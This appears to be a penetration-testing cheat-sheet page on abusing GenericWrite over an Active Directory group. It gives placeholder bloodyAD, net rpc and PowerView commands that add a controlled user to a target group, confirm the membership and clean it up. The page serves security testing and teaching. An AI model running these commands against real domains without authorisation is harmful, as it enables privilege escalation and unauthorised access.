# GenericWrite

### Over a group

{% tabs %}
{% tab title="BloodyAD" %}
```shellscript
# Add a controlled user to the target group 
bloodyAD -d <DOMAIN> --host <COMPUTER> -u <CONTROLLED_USER> -p <PASSWORD> add groupMember '<TARGET_GROUP>' <TARGET_USER> 

# Check that our user was added
bloodyAD -u <USER> -d <DOMAIN> -p <PASSWORD> --host <COMPUTER> get object '<GROUP>' --attr member 
```
{% endtab %}

{% tab title="Net" %}
```shellscript
# Add a controlled user to the target group 
net rpc group addmem "<GROUP>" "<TARGET_USER>" -U "<DOMAIN>"/"<CONTROLLED_USER>"%"<PASSWORD>" -S "<DC>"

# Check that our user was added
net rpc group members '<GROUP>' -U <DOMAIN>/<USER>%<PASSWORD> -S <DC>
```
{% endtab %}

{% tab title="PowerView" %}
```shellscript
# Authenticate as the user who can change the password of the target 
$SecPassword = ConvertTo-SecureString '<CONTROLLED_USER_PASSWORD>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<CONTROLLED_USER>', $SecPassword)

# Add a controlled user to the target group
Add-DomainGroupMember -Identity '<TARGET_GROUP>' -Members '<TARGET_USER>' -Credential $Cred -Verbose

# Confirm the user was added to the group
Get-DomainGroupMember -Identity "<TARGET_GROUP>" | Select MemberName |? {$_.MemberName -eq '<TARGET_USER>'} -Verbose

# Cleanup => Remove added user from the target group
Remove-DomainGroupMember -Identity "<TARGET_GROUP>" -Members '<TARGET_USER>' -Credential $Cred -Verbose
```
{% endtab %}
{% endtabs %}
